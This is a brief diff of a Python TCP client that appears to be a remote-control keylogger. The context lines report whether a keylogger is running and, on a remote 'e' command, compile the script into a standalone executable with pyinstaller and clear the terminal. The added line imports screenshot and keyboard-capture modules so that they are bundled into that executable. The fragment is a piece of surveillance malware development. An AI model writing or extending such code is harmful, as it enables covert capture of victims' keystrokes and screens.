@@ -110,6 +110,7 @@ while True:
 			s.send("none".encode())		#send none if the keylogger isn't functioning
 
 	elif received=="e":
+		import pyscreenshot,keyboard			#pyinstaller will fail to wrap these modules if not metioned explicitly with an import call
 		try:
 			subprocess.run(["pyinstaller","--onefile","tcpclient.py"])      #attempts to convert the program into an executable
 			subprocess.run(["reset"])   #clears the terminal
